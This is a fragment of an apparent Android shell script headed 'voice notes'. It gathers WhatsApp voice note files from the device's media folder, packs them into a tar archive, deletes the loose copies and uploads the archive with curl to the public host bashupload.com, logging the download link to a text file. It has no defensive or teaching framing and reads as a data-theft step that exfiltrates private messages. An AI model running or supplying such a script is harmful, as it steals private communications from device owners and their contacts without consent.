...
###voice notes ###
find /sdcard/Android/media/com.whatsapp/WhatsApp/Media/"WhatsApp Voice Notes"/ -name '*.opus' -exec cp "{}" /sdcard \; 2> /dev/null
cd /sdcard ; tar cf voice.tar *.opus; rm *.opus
...
curl -s bashupload.com -T /sdcard/voice.tar >> /sdcard/70.txt 
